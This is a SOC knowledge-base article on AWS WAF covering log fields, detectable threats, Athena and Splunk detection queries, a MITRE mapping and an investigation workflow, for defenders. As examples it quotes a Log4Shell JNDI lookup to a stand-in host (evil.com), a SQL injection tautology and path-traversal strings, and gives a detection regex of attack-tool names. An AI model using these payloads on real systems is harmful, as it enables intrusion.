# AWS WAF — SOC Analyst Knowledge Base

> **Maintained by:** Cloud Security Engineering  
> **Audience:** SOC Analysts · Detection Engineers · Incident Responders · Cloud Security Engineers · Students  
> **Classification:** Internal Use  
> **Version:** 2.0  

---

## Table of Contents

1. [What Is This Service?](#1-what-is-this-service)
2. [Why Should a SOC Analyst Care?](#2-why-should-a-soc-analyst-care)
3. [Where Does It Sit in the Architecture?](#3-where-does-it-sit-in-the-architecture)
4. [What Visibility Does It Provide?](#4-what-visibility-does-it-provide)
5. [What Logs Do I Get?](#5-what-logs-do-i-get)
6. [What Are the Most Important Fields?](#6-what-are-the-most-important-fields)
7. [What Threats Can Be Detected?](#7-what-threats-can-be-detected)
8. [What Should SOC Teams Monitor?](#8-what-should-soc-teams-monitor)
9. [Detection Ideas](#9-detection-ideas)
10. [MITRE ATT&CK Coverage](#10-mitre-attck-coverage)
11. [Investigation Guide](#11-investigation-guide)
12. [Incident Response Considerations](#12-incident-response-considerations)
13. [Common Mistakes](#13-common-mistakes)
14. [Related Services](#14-related-services)
15. [Key Takeaways](#15-key-takeaways)

---

## 1. What Is This Service?

AWS WAF is a Layer 7 (application layer) firewall. It sits in front of your web-facing AWS resources and inspects every incoming HTTP and HTTPS request before it reaches your application. Based on rules you define (or rules AWS provides), it can allow, block, count, or challenge the request with a CAPTCHA.

That's the simple version. Here's the part that matters operationally.

WAF works by associating a **Web ACL** (Access Control List) with a resource. Rules inside the ACL are evaluated in priority order, top to bottom. The first rule that matches and has a terminating action (BLOCK or ALLOW) stops evaluation. Rules set to COUNT don't stop the chain — they just tag the request and keep going. This distinction matters a lot when you're investigating why something was or wasn't blocked.

Rules can inspect nearly any part of the HTTP request: URI path, query string, headers, body (up to 8KB by default, extendable to 64KB), HTTP method, and the originating IP. You can write your own rules using the WAF visual editor or JSON syntax, or you can use **Managed Rule Groups** — pre-built rulesets maintained by AWS or third parties like Fortinet and F5.

The most commonly deployed AWS managed groups are:

- `AWSManagedRulesCommonRuleSet` — broad OWASP-style coverage including XSS, path traversal, bad inputs
- `AWSManagedRulesSQLiRuleSet` — SQL injection detection across headers, URI, body
- `AWSManagedRulesKnownBadInputsRuleSet` — Log4Shell (`${jndi:`), SSRF, Spring4Shell patterns
- `AWSManagedRulesBotControlRuleSet` — bot classification and control
- `AWSManagedRulesATPRuleSet` — Account Takeover Prevention, specifically for login endpoints

One thing to internalize early: **WAF is not magic**. It doesn't understand your application. It pattern-matches against rules. A determined attacker who knows what ruleset you're running will try to encode payloads to evade detection. Your managed rules are a solid baseline — not a guarantee.

---

## 2. Why Should a SOC Analyst Care?

If your environment hosts any web application on AWS — and almost every AWS environment does — WAF is probably your most telemetry-rich source for application-layer attack activity. Not just blocking activity. The logs tell you what attackers are actually throwing at your application, even when they're failing.

Here's a practical way to think about it: your network firewall blocks at layers 3 and 4. It sees IP addresses and ports. WAF sees SQL payshots, shell commands embedded in query parameters, automated scanners identifying themselves with tool-specific User-Agent strings, and credential stuffing bots hitting your login endpoint 800 times a minute. That's the kind of signal that drives real detections.

From a SOC perspective, WAF sits at an interesting intersection:

**It's both a prevention and a detection tool.** When it blocks a SQLi attempt, that's prevention. When it logs a COUNT rule hit — meaning something suspicious fired but wasn't blocked — that's detection signal you need to act on. A lot of teams configure rules in COUNT mode while tuning them, and then forget to flip them to BLOCK. Those COUNT logs are your early warning system, and if nobody's watching them, you're essentially building a smoke detector with no alarm.

**It gives you ground truth on what attackers are targeting.** If you suddenly see a spike in `AWSManagedRulesSQLiRuleSet` blocks against your `/api/v2/users` endpoint at 3am, that tells you something very specific: someone is probing that endpoint with SQL injection, and they're doing it outside business hours. That's a story. Your job is to figure out whether they succeeded before WAF started blocking, and whether they tried from other IPs after getting blocked.

**It's also a signal that attackers may try to tamper with.** Once a WAF is in place, a smart attacker will want it out of the way. Watch CloudTrail for WAF API calls — specifically anyone deleting rules, disabling logging, or modifying your IP blocklists. That's the kind of thing that happens at 2am right before a deployment of malware or before a data exfiltration run.

> **Analyst Tip:** When you first get access to a new AWS environment, before you do anything else, check whether WAF logging is actually enabled. Go look at the Web ACL, check the logging configuration tab. You'd be surprised how often it's in COUNT mode everywhere, or logging is pointing to a Kinesis stream that never got connected to anything. Don't assume it's working just because WAF exists.

---

## 3. Where Does It Sit in the Architecture?

WAF attaches directly to supported AWS resources. The request goes through WAF before it reaches the origin. There's no separate appliance to manage, no traffic mirroring, no out-of-band mode — it's inline and synchronous by design.

```
┌─────────────────────────────────────────────────────────────────────┐
│                          INTERNET / CLIENT                          │
└─────────────────────────────────┬───────────────────────────────────┘
                                  │
                                  ▼
                    ┌─────────────────────────┐
                    │       AWS WAF            │
                    │  (Web ACL evaluation)    │
                    │                          │
                    │  Rule 1 → Priority 0     │
                    │  Rule 2 → Priority 1     │
                    │  Rule N → Priority N     │
                    │                          │
                    │  Decision:               │
                    │  ALLOW / BLOCK /         │
                    │  COUNT / CAPTCHA         │
                    └────────────┬────────────┘
                                 │
              ┌──────────────────┼──────────────────┐
              ▼                  ▼                   ▼
     ┌────────────────┐  ┌──────────────┐  ┌──────────────────┐
     │   CloudFront   │  │     ALB      │  │  API Gateway /   │
     │  Distribution  │  │  (Regional)  │  │ AppSync/Cognito  │
     └────────┬───────┘  └──────┬───────┘  └────────┬─────────┘
              │                  │                    │
              └──────────────────┼────────────────────┘
                                 ▼
                        Application / Backend
```

**The scope distinction matters operationally:**

- WAF on **CloudFront** is global and must be managed from `us-east-1`. It's the right choice for public-facing consumer applications where you want protection at the CDN edge before traffic even enters a region.
- WAF on **ALB** is regional. It's the most common deployment for internal or API-heavy applications. Each region needs its own Web ACL.
- WAF on **API Gateway** protects REST and WebSocket APIs directly. If you have a microservices environment where API Gateway is your front door, this is where you'd want coverage.
- WAF on **Cognito** protects the user pool itself — the login flow, token endpoint, and sign-up page. This is specifically where you'd put Account Takeover Protection rules.

**What WAF does not protect:**

- Direct EC2 instances without an ALB in front
- S3 buckets (CloudFront can front S3, and WAF attaches to CloudFront)
- SSH, RDP, or any non-HTTP/S traffic — that's security group and network firewall territory
- Anything inside your VPC that doesn't egress through a WAF-enabled resource

If you're doing a security posture review, map out every public-facing ALB and API Gateway endpoint, then verify each one has a Web ACL associated. Gaps here are common and dangerous.

---

## 4. What Visibility Does It Provide?

WAF gives you full Layer 7 visibility for HTTP/S traffic it inspects. Every request that passes through — allowed or blocked — can be logged. Here's what that means in practice:

**You can see the actual payloads.** The query string, URI path, and up to 8KB of the request body are available in logs. If someone sends `' OR '1'='1` in a form field, you'll see it. If someone embeds `${jndi:ldap://evil.com/x}` in a User-Agent header, you'll see it. This is fundamentally different from network-level logging.

**You can reconstruct attack sequences.** Because every request is timestamped with the source IP, URI, method, and action taken, you can pull the full timeline of what a specific IP sent to your application over a given window. This is invaluable during an incident — you can answer "did this IP successfully reach the backend before WAF started blocking it?"

**You can distinguish automated from human traffic.** WAF logs User-Agent strings. Automated attack tools are often lazy about this — sqlmap identifies itself explicitly, for example. Even when they try to blend in, Bot Control managed rules use more sophisticated signals like TLS fingerprinting and request rate patterns.

**You can see what rules almost fired.** `nonTerminatingMatchingRules` in the log captures rules set to COUNT that matched, even when a BLOCK rule terminated the evaluation. This is where evasion attempts show up — a request that technically got through because no BLOCK rule fired, but multiple COUNT rules lit up.

**What WAF cannot tell you:**

- Whether a payload that reached your backend was successfully exploited (that requires application logs)
- What the server responded with (you'd need ALB or CloudFront logs for response codes)
- Anything about encrypted traffic that WAF itself is terminating (it sees post-TLS plaintext)
- Traffic that doesn't go through WAF-enabled endpoints

> **Analyst Tip:** WAF logs and ALB access logs are complementary. WAF tells you the decision made at the firewall. ALB logs tell you what actually made it through and what the backend did with it. Get in the habit of correlating both when investigating a potential bypass.

---

## 5. What Logs Do I Get?

### WAF Full Logging

This is the primary log source and it's the one you need. It's not enabled by default — someone has to deliberately turn it on.

**Delivery options:**

| Destination | Latency | Practical Use |
|---|---|---|
| Kinesis Data Firehose → S3 | Near real-time (~60s) | SIEM ingest, long-term archival |
| CloudWatch Logs | Near real-time | Alerting, metric filters, quick dashboards |
| S3 directly | ~5–10 min buffered | Athena queries, Macie scans |

For SOC operations, Kinesis → S3 → SIEM is the standard pattern. CloudWatch Logs is useful for quick alerting but gets expensive at scale. Don't send raw WAF logs to CloudWatch if you're processing millions of requests per hour.

**Log naming:** WAF logs must be named with the prefix `aws-waf-logs-`. If you're setting up a Firehose delivery stream and wonder why the logging configuration keeps rejecting it, that prefix is probably missing. Classic gotcha.

### Sampled Requests

Even without full logging enabled, AWS gives you **sampled requests** in the WAF console — up to 100 matching requests per rule per 3-hour window. This is useful for ad-hoc rule tuning but useless for security monitoring. Never rely on sampled requests for SOC work.

### CloudTrail — WAF Management Plane

Every API call to the WAF service is logged in CloudTrail under the source `wafv2.amazonaws.com`. This is separate from the request logs but equally important for:

- Detecting unauthorized rule changes
- Tracking who disabled logging
- Auditing Web ACL modifications
- Catching IP set tampering

CloudTrail WAF events are management events, so they're captured by default if you have a trail configured. Make sure your trail covers all regions, not just one.

### What You Won't Find Here

WAF doesn't log the server's response. It doesn't log TLS handshake details (check CloudFront access logs for that). It doesn't tell you whether a blocked IP tried again from a different address — that's a correlation you build yourself.

---

## 6. What Are the Most Important Fields?

Not all fields are created equal. Here's what actually matters during an investigation, and why.

### The Decision Fields

```json
"action": "BLOCK",
"terminatingRuleId": "AWS-AWSManagedRulesSQLiRuleSet",
"terminatingRuleType": "MANAGED_RULE_GROUP"
```

`action` tells you the outcome. `terminatingRuleId` tells you why. These two together tell you the story of what happened. If `action` is `ALLOW` but you also see entries in `nonTerminatingMatchingRules`, that's where things get interesting — the request got through, but something about it triggered detection rules.

### The Request Identity Fields

```json
"httpRequest": {
  "clientIp": "198.51.100.42",
  "country": "RU",
  "httpMethod": "POST",
  "uri": "/api/v1/authenticate",
  "args": "username=admin&password=admin123"
}
```

`clientIp` is your pivot point for threat actor tracking. One important caveat: if your application is behind a proxy or CDN that isn't CloudFront, `clientIp` might be the proxy's IP, not the real client. Check `X-Forwarded-For` in the headers array. But also know that `X-Forwarded-For` is trivially spoofable — any attacker who knows your header inspection logic can inject arbitrary values.

`country` is useful for rapid triage and geo-restriction decisions, but don't overweight it. VPN and proxy services make country codes unreliable for attribution.

### The Headers Array

```json
"headers": [
  { "name": "User-Agent", "value": "sqlmap/1.7.8#stable" },
  { "name": "X-Forwarded-For", "value": "203.0.113.1" },
  { "name": "Authorization", "value": "Bearer eyJhbGciOi..." }
]
```

User-Agent strings are gold for scanner identification. sqlmap is famously self-identifying. Nikto, Nuclei, Burp Suite's active scanner, Masscan — all leave distinct UA fingerprints. Don't build detections solely on UA matching; sophisticated attackers randomize them. But for catching commodity attacks and automated scanners, it's a fast win.

If `Authorization` headers appear in WAF logs against blocked requests, note that — it may indicate an attacker attempting authenticated exploitation, which carries higher severity than unauthenticated probing.

### The Match Details

```json
"terminatingRuleMatchDetails": [
  {
    "conditionType": "SQL_INJECTION",
    "sensitivityLevel": "HIGH",
    "location": "QUERY_STRING",
    "matchedData": ["UNION", "SELECT", "--"]
  }
]
```

`matchedData` shows you the actual tokens that triggered the rule. This is your evidence. During an investigation, this is what you screenshot, this is what goes into your ticket, and this is what you use to determine whether the payload was a genuine attack attempt versus a false positive from a legitimate application sending unusual characters.

### The Label Array

```json
"labels": [
  { "name": "awswaf:managed:aws:sql-injection-ruleset:SQLi_Body" },
  { "name": "awswaf:managed:aws:bot-control:bot:category:http_library" }
]
```

Labels are applied by rules even when those rules don't terminate evaluation. They're how you build correlation logic — a request might not match any BLOCK rule, but if it carries three separate detection labels, that's meaningful. Labels also persist through the rule evaluation chain, so downstream rules can reference them.

### The nonTerminatingMatchingRules Array

```json
"nonTerminatingMatchingRules": [
  {
    "ruleId": "CountSuspiciousUserAgent",
    "action": "COUNT",
    "ruleMatchDetails": null
  }
]
```

This array is where partial matches and COUNT-mode rule hits show up. If you see a request with `action: ALLOW` but three entries here, that request is worth a second look. It got through, but it triggered detection logic along the way.

---

## 7. What Threats Can Be Detected?

WAF's visibility is limited to HTTP/S at the application layer, but within that scope, it covers a meaningful range of attack types. Here's a realistic breakdown — what it catches well, what it catches partially, and where it has blind spots.

### Caught Well

**SQL Injection (SQLi)**
The SQLi managed rule group is genuinely good. It detects injection in query strings, URI paths, headers, and request bodies. The HIGH sensitivity setting catches more but also generates more false positives in applications that accept raw text input (search boxes, rich-text editors). Tune sensitivity based on your application's input profile.

**Cross-Site Scripting (XSS)**
Effective for reflected XSS payloads submitted via GET/POST parameters. Less useful for stored XSS (the payload that gets stored in your database doesn't go back through WAF when it's served). WAF catches the injection attempt, not the execution.

**Known Bad Inputs / CVE-Based Patterns**
The `KnownBadInputsRuleSet` catches patterns from specific high-profile CVEs. Log4Shell detection (`${jndi:`) here was one of the most widely deployed protections during that incident in late 2021. This ruleset gets updated by AWS as new critical vulnerabilities emerge. Track the changelog.

**Scanner and Tool Detection**
A combination of User-Agent matching, request rate anomalies, and Bot Control signals catches commodity scanners reliably. Tools like sqlmap, Nikto, Nuclei with default configurations, and Shodan-style crawlers all leave identifiable patterns.

**Credential Stuffing**
Rate-based rules detect high-volume login attempts from a single IP. The ATP (Account Takeover Prevention) managed rule group goes further — it can detect distributed credential stuffing where traffic is spread across many IPs, tracking response patterns from your login endpoint to identify failed authentication bursts.

**Path Traversal and File Inclusion**
The Common Rule Set includes patterns for `../`, `..\`, `/etc/passwd`, `/proc/self/`, and similar traversal sequences. These are high-fidelity signals — there's almost no legitimate reason for these to appear in request paths.

### Caught Partially

**Business Logic Abuse**
WAF has no understanding of your application's business logic. It won't know that someone is systematically abusing a "forgot password" flow to enumerate valid usernames, unless you write a rate-based rule specifically for that endpoint.

**Authentication Bypass**
Mass exploitation of authentication flaws requires application-level context WAF doesn't have. It can catch the attack patterns (malformed tokens, injection into auth parameters), but it won't catch subtle JWT algorithm confusion attacks without a very specific custom rule.

**API Abuse**
Generic rate limiting helps, but distinguishing legitimate burst usage from scraping or enumeration requires application-context rules. WAF can get you part of the way there.

### Not Detected

**Successful Exploitation That Bypasses Rules**
A well-crafted encoded payload that doesn't match any rule will get through. WAF is not an application vulnerability scanner. It will not find all attack vectors — just the ones your rules cover.

**Server-Side Logic Errors**
Business logic flaws, IDOR, access control weaknesses at the code level — none of these are visible to WAF.

**Insider Threats via Legitimate Sessions**
An authenticated attacker using valid credentials looks like a normal user to WAF.

---

## 8. What Should SOC Teams Monitor?

Monitoring WAF without a framework produces alert fatigue. Here's what's actually worth watching, prioritized by signal quality.

### Tier 1 — High-Priority, Low-Noise Signals

**Spike in BLOCK actions on sensitive endpoints**
A sudden increase in WAF blocks against `/admin`, `/api/v*/auth`, `/login`, or `/api/v*/users` is a tier-1 alert. Baseline your normal block rate per endpoint; anything 3x above baseline in a 5-minute window warrants immediate investigation.

**Rate-based rule triggers on authentication endpoints**
A rate-based rule firing means an IP exceeded your threshold. On a login endpoint, this is credential stuffing until proven otherwise.

**KnownBadInputsRuleSet firing**
`${jndi:`, Spring4Shell patterns, and similar entries in this ruleset have almost no legitimate use case. Every hit here should be reviewed.

**WAF logging disabled or configuration modified**
CloudTrail events for `DeleteLoggingConfiguration`, `UpdateWebACL`, or `DeleteIPSet` from a non-service principal. This is a tier-1 alert — an attacker who has compromised IAM credentials may disable WAF logging before their next move.

### Tier 2 — Medium-Priority, Requires Context

**COUNT rule hits without subsequent BLOCK**
Traffic that triggers COUNT rules but doesn't get blocked means your detection layer saw something but your prevention layer didn't act on it. These are gaps to track. If you have rules in COUNT mode for more than 2 weeks, you're accumulating blind spots.

**Requests from high-risk countries on non-public endpoints**
Your API shouldn't be receiving traffic from jurisdictions where you have no customers or partners. Context-dependent, but worth tracking.

**Multiple rule group matches on same request**
A single request that triggers SQLi, XSS, and scanner detection labels simultaneously is almost certainly malicious. The poly-match pattern is a strong signal.

**Unusual HTTP methods on production endpoints**
TRACE, OPTIONS beyond CORS preflight, DELETE or PUT against endpoints that shouldn't accept those methods — these indicate exploratory or scanning behavior.

### Tier 3 — Useful for Threat Hunting, Not Real-Time Alerting

**Slow enumeration patterns from single IPs**
Low-and-slow scanning that stays under rate limits. Detectable by looking at distinct URI counts from a single IP over a 24-hour window.

**UA string rotation from same IP**
An IP that sends requests with 15 different User-Agent strings in an hour is either testing detection coverage or trying to evade fingerprinting-based rules.

**Geographic shift for authenticated sessions**
If you can correlate WAF source IPs with session identifiers in your application logs, a session that moves from one continent to another within an hour is suspicious.

---

## 9. Detection Ideas

These are practical starting points. Adapt thresholds to match your environment's baseline traffic. A detection that fires 500 times a day is worse than no detection at all.

---

### D-001 — SQL Injection Attack in Progress

**What it catches:** Active SQLi attempts against any endpoint, specifically high-severity matches from the WAF SQLi managed rule group.

**Signal source:** WAF full logs

```sql
-- Athena
SELECT
  httpRequest.clientIp        AS src_ip,
  httpRequest.country         AS country,
  httpRequest.uri             AS target_uri,
  httpRequest.httpMethod      AS method,
  terminatingRuleId           AS rule_fired,
  COUNT(*)                    AS hit_count,
  MIN(from_unixtime(timestamp/1000)) AS first_seen,
  MAX(from_unixtime(timestamp/1000)) AS last_seen
FROM waf_logs
WHERE action = 'BLOCK'
  AND terminatingRuleId LIKE '%SQLi%'
  AND from_unixtime(timestamp/1000) >= NOW() - INTERVAL '1' HOUR
GROUP BY
  httpRequest.clientIp,
  httpRequest.country,
  httpRequest.uri,
  httpRequest.httpMethod,
  terminatingRuleId
HAVING COUNT(*) >= 5
ORDER BY hit_count DESC;
```

**Tuning note:** `>= 5` helps eliminate single-hit false positives from legitimate applications with unusual encoding. If your baseline shows legitimate traffic triggering this, check the `matchedData` field — real false positives usually show benign tokens, not SQL keywords.

---

### D-002 — Credential Stuffing or Brute Force

**What it catches:** Rate-based rule blocks on authentication-related endpoints, or high-volume POST activity without a rate rule firing yet.

```sql
-- Athena
SELECT
  httpRequest.clientIp       AS src_ip,
  httpRequest.country        AS country,
  httpRequest.uri            AS endpoint,
  COUNT(*)                   AS request_count,
  SUM(CASE WHEN action = 'BLOCK' THEN 1 ELSE 0 END) AS blocked,
  SUM(CASE WHEN action = 'ALLOW' THEN 1 ELSE 0 END) AS allowed
FROM waf_logs
WHERE httpRequest.httpMethod = 'POST'
  AND (
    httpRequest.uri LIKE '%/login%'
    OR httpRequest.uri LIKE '%/auth%'
    OR httpRequest.uri LIKE '%/signin%'
    OR httpRequest.uri LIKE '%/token%'
  )
  AND from_unixtime(timestamp/1000) >= NOW() - INTERVAL '15' MINUTE
GROUP BY
  httpRequest.clientIp,
  httpRequest.country,
  httpRequest.uri
HAVING COUNT(*) >= 30
ORDER BY request_count DESC;
```

**Why both blocked and allowed matter:** If `allowed > 0` alongside a high request count, those are potentially successful logins from an automated attack. The attacker found valid credentials. Escalate immediately.

---

### D-003 — Security Scanner Fingerprint

**What it catches:** Known attack tool User-Agent strings. Not sophisticated evasion, but catches the lazy attacker — which is most of them.

```sql
-- Athena (header inspection requires unnesting)
SELECT
  httpRequest.clientIp        AS src_ip,
  httpRequest.country         AS country,
  header.value                AS user_agent,
  COUNT(*)                    AS request_count,
  ARRAY_AGG(DISTINCT httpRequest.uri) AS targeted_uris
FROM waf_logs
CROSS JOIN UNNEST(httpRequest.headers) AS t(header)
WHERE header.name = 'User-Agent'
  AND REGEXP_LIKE(
    LOWER(header.value),
    'sqlmap|nikto|nmap|masscan|burpsuite|acunetix|nessus|nuclei|zgrab|gobuster|dirbuster|feroxbuster|wfuzz|metasploit|hydra|medusa'
  )
  AND from_unixtime(timestamp/1000) >= NOW() - INTERVAL '24' HOUR
GROUP BY
  httpRequest.clientIp,
  httpRequest.country,
  header.value
ORDER BY request_count DESC;
```

**Analyst Tip:** When you find a scanner hit, don't just block the current IP and move on. Look at what URIs it hit. That tells you what it was looking for — and whether it found anything before WAF started seeing it.

---

### D-004 — WAF Evasion Attempt (ALLOW with Multiple COUNT Hits)

**What it catches:** Requests that made it through WAF but triggered multiple detection rules in COUNT mode — a pattern consistent with crafted payloads designed to slip past BLOCK rules.

```sql
-- Athena
SELECT
  timestamp,
  httpRequest.clientIp        AS src_ip,
  httpRequest.uri             AS uri,
  httpRequest.args            AS query_params,
  action,
  CARDINALITY(nonTerminatingMatchingRules) AS count_rule_hits,
  CARDINALITY(labels)                      AS label_count
FROM waf_logs
WHERE action = 'ALLOW'
  AND CARDINALITY(nonTerminatingMatchingRules) >= 2
  AND from_unixtime(timestamp/1000) >= NOW() - INTERVAL '1' HOUR
ORDER BY count_rule_hits DESC, label_count DESC;
```

**Why this matters:** Multiple COUNT rule fires on an ALLOW means your detection rules saw something but your block rules missed it. This is an active gap. Correlate the matched rule IDs against your managed rule group configurations — the rules probably need to move from COUNT to BLOCK mode, or a new custom rule needs to be written.

---

### D-005 — WAF Configuration Tampering (CloudTrail)

**What it catches:** Unauthorized modification or disabling of WAF controls via the management plane.

```sql
-- CloudTrail in Athena
SELECT
  eventtime,
  eventname,
  useridentity.arn        AS actor_arn,
  useridentity.type       AS identity_type,
  sourceipaddress         AS source_ip,
  useragent,
  awsregion,
  requestparameters
FROM cloudtrail_logs
WHERE eventsource = 'wafv2.amazonaws.com'
  AND eventname IN (
    'UpdateWebACL',
    'DeleteWebACL',
    'PutLoggingConfiguration',
    'DeleteLoggingConfiguration',
    'UpdateIPSet',
    'DeleteIPSet',
    'UpdateRuleGroup',
    'DeleteRuleGroup',
    'DisassociateWebACL'
  )
  AND useridentity.type != 'AWSService'
  AND date_partition >= DATE_FORMAT(NOW() - INTERVAL '7' DAY, '%Y/%m/%d')
ORDER BY eventtime DESC;
```

**What to look for in results:**
- `sourceipaddress` outside expected admin ranges
- `useridentity.arn` referencing roles or users that shouldn't touch WAF
- `eventname = 'DeleteLoggingConfiguration'` — this should almost never happen legitimately
- Changes occurring outside of business hours or change windows

---

### D-006 — Distributed Attack Pattern (Many IPs, Same Target)

**What it catches:** Coordinated attacks where traffic is distributed across many source IPs to evade rate-based rules — characteristic of botnets and professional threat actors.

```sql
-- Athena
SELECT
  httpRequest.uri             AS target_endpoint,
  COUNT(DISTINCT httpRequest.clientIp) AS unique_src_ips,
  COUNT(*)                             AS total_requests,
  SUM(CASE WHEN action = 'BLOCK' THEN 1 ELSE 0 END) AS blocked,
  SUM(CASE WHEN action = 'ALLOW' THEN 1 ELSE 0 END) AS allowed,
  ARRAY_AGG(DISTINCT httpRequest.country) AS source_countries
FROM waf_logs
WHERE from_unixtime(timestamp/1000) >= NOW() - INTERVAL '30' MINUTE
GROUP BY httpRequest.uri
HAVING COUNT(DISTINCT httpRequest.clientIp) >= 25
   AND COUNT(*) >= 200
ORDER BY unique_src_ips DESC;
```

---

### Splunk SPL Equivalents

For teams running Splunk, here are the same core detections translated:

```spl
| SPL: D-001 SQLi Detection
index=aws_waf sourcetype="aws:waf"
| spath "action" output=action
| spath "terminatingRuleId" output=ruleId
| spath "httpRequest.clientIp" output=src_ip
| spath "httpRequest.uri" output=uri
| where action="BLOCK" AND match(ruleId, "SQLi")
| bin _time span=5m
| stats count AS hits, values(uri) AS uris, values(ruleId) AS rules BY src_ip, _time
| where hits >= 5
| eval alert="SQLi Attack Detected", severity="HIGH"
```

```spl
| SPL: D-005 WAF Config Tampering
index=cloudtrail sourcetype="aws:cloudtrail"
| where eventSource="wafv2.amazonaws.com"
| where eventName IN ("UpdateWebACL","DeleteWebACL","DeleteLoggingConfiguration","PutLoggingConfiguration","DeleteIPSet","DisassociateWebACL")
| where NOT userIdentity.type="AWSService"
| table _time, eventName, userIdentity.arn, sourceIPAddress, awsRegion
| eval severity="CRITICAL", alert="WAF Config Change"
| sort -_time
```

---

## 10. MITRE ATT&CK Coverage

This mapping is based on what WAF logs can realistically surface — either directly blocking the technique or providing visibility that enables detection after correlation.

| Tactic | Technique | Technique ID | WAF Coverage | Notes |
|---|---|---|---|---|
| Reconnaissance | Active Scanning: Vulnerability Scanning | T1595.002 | **Strong** | Scanner UA strings, high 4xx rate, probing patterns |
| Reconnaissance | Gather Victim Network Info | T1590 | **Partial** | Can see enumeration of endpoints and API structure |
| Initial Access | Exploit Public-Facing Application | T1190 | **Strong** | SQLi, XSS, path traversal, Log4Shell, SSRF patterns |
| Initial Access | Valid Accounts: Cloud Accounts | T1078.004 | **Weak** | Can detect spray attempts; not successful auth |
| Credential Access | Brute Force: Password Guessing | T1110.001 | **Strong** | Rate-based rules on login endpoints |
| Credential Access | Brute Force: Credential Stuffing | T1110.004 | **Strong** | ATP rule group; rate-based; distributed patterns |
| Credential Access | Brute Force: Password Spraying | T1110.003 | **Partial** | Visible if volume-based; low-and-slow evades rate rules |
| Defense Evasion | Impair Defenses: Disable/Modify Tools | T1562.001 | **Strong** | CloudTrail: UpdateWebACL, DeleteLoggingConfiguration |
| Defense Evasion | Obfuscated Files/Information | T1027 | **Partial** | Encoded payloads; WAF catches common encodings |
| Defense Evasion | Masquerading | T1036 | **Partial** | UA spoofing visible; hard to block definitively |
| Impact | Endpoint Denial of Service: Service Exhaustion | T1499.002 | **Strong** | Rate-based rules; high block volume alarms |
| Collection | Data from Information Repositories | T1213 | **Partial** | SQLi against data endpoints; not post-exploitation |

**Coverage gaps to acknowledge:**

- Post-authentication lateral movement — WAF doesn't see internal traffic
- Anything after a successful exploitation — once an attacker is in your app, WAF is no longer relevant
- Supply chain attacks, insider threats, misconfiguration exploitation at the IAM/S3/etc. level

---

## 11. Investigation Guide

This is the actual workflow you'd run during a live incident involving WAF. Steps are ordered roughly by priority — establish what happened first, then figure out impact, then respond.

---

### Phase 1 — Establish What Happened

**Q: Is WAF actively blocking an attack, or did something get through?**

Start with the last 15 minutes. Pull blocked versus allowed counts for the suspicious endpoint:

```sql
SELECT action, COUNT(*) AS count
FROM waf_logs
WHERE httpRequest.uri LIKE '/api/v1/users%'
  AND from_unixtime(timestamp/1000) >= NOW() - INTERVAL '15' MINUTE
GROUP BY action;
```

If you see a significant `ALLOW` count alongside blocks, the attack wasn't fully stopped. That becomes your priority — figure out what got through.

**Q: What is the full timeline of the attack?**

Pull the complete request history for the suspicious source IPs, sorted chronologically:

```sql
SELECT
  from_unixtime(timestamp/1000)   AS request_time,
  httpRequest.clientIp            AS src_ip,
  httpRequest.httpMethod          AS method,
  httpRequest.uri                 AS uri,
  httpRequest.args                AS params,
  action,
  terminatingRuleId               AS rule,
  CARDINALITY(nonTerminatingMatchingRules) AS count_hits
FROM waf_logs
WHERE httpRequest.clientIp IN ('198.51.100.42', '198.51.100.43')
  AND from_unixtime(timestamp/1000) >= NOW() - INTERVAL '6' HOUR
ORDER BY timestamp ASC;
```

Look for the pattern: reconnaissance → probing → exploitation attempts. Early in the sequence, you may see ALLOW actions (before WAF detected the pattern) followed by blocks. The ALLOWs are where damage may have occurred.

---

### Phase 2 — Assess Impact

**Q: Did any blocked attacker IPs successfully reach the backend before blocks started?**

Cross-reference WAF logs with ALB access logs:

```sql
SELECT
  w.httpRequest.clientIp   AS src_ip,
  w.action                 AS waf_action,
  a.target_status_code     AS backend_response,
  a.request_creation_time  AS timestamp,
  w.httpRequest.uri        AS uri
FROM waf_logs w
JOIN alb_logs a
  ON w.httpRequest.clientIp = a.client_ip
  AND w.httpRequest.uri = a.request_uri
WHERE w.httpRequest.clientIp IN ('198.51.100.42')
  AND a.target_status_code NOT IN ('400', '403', '404', '429')
ORDER BY a.request_creation_time ASC;
```

Backend responses of 200 or 302 on endpoints that shouldn't be publicly accessible are the most damaging finding here.

**Q: Was the attack distributed, or is this single-IP?**

```sql
SELECT
  httpRequest.clientIp,
  COUNT(*) AS hit_count,
  MIN(from_unixtime(timestamp/1000)) AS first_seen,
  MAX(from_unixtime(timestamp/1000)) AS last_seen
FROM waf_logs
WHERE action = 'BLOCK'
  AND terminatingRuleId LIKE '%SQLi%'
  AND from_unixtime(timestamp/1000) >= NOW() - INTERVAL '2' HOUR
GROUP BY httpRequest.clientIp
ORDER BY hit_count DESC;
```

If you see 50 IPs all targeting the same endpoint with the same payload pattern, that's a coordinated botnet. Single-IP scenarios are easier to contain; distributed attacks require a different response posture.

---

### Phase 3 — Verify Rule Integrity

Before you finish an investigation, always confirm the WAF config itself hasn't been tampered with. It takes 2 minutes and catches a category of attack most analysts skip.

```bash
# Check recent WAF management API calls
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventSource,AttributeValue=wafv2.amazonaws.com \
  --start-time "$(date -u -d '24 hours ago' '+%Y-%m-%dT%H:%M:%SZ')" \
  --query 'Events[?EventName!=`ListWebACLs` && EventName!=`GetWebACL` && EventName!=`GetLoggingConfiguration`].[EventTime,EventName,Username,SourceIPAddress]' \
  --output table

# Confirm logging is still enabled
aws wafv2 get-logging-configuration \
  --resource-arn "arn:aws:wafv2:us-east-1:123456789012:regional/webacl/MyWebACL/abc123" \
  --region us-east-1

# Get current Web ACL rule summary
aws wafv2 get-web-acl \
  --name "MyWebACL" \
  --scope REGIONAL \
  --id "abc123" \
  --region us-east-1 \
  --query 'WebACL.Rules[].{Name:Name,Priority:Priority,Action:Action}' \
  --output table
```

If `get-logging-configuration` throws an error — logging was disabled. That's an incident in itself.

---

### Phase 4 — Threat Actor Enrichment

Once you have source IPs, run them through enrichment before deciding response actions. This informs whether you're dealing with a script kiddie, a known threat actor infrastructure, or possibly a misconfigured legitimate service.

**Internal checks first:**
- Has this IP appeared in your WAF logs before today?
- Has it appeared in GuardDuty findings?
- Is it in any existing WAF IP set (blocklist or allowlist)?

**External enrichment:**
- AbuseIPDB — abuse history and reports
- Shodan — what's running on this IP
- VirusTotal — passive DNS, community detections
- BGP / ASN lookup — what ISP/hosting provider owns this IP range

An IP from a residential ISP looks different from an IP from a bulletproof hosting provider in Eastern Europe. Both should be blocked, but the second one warrants escalation.

---

## 12. Incident Response Considerations

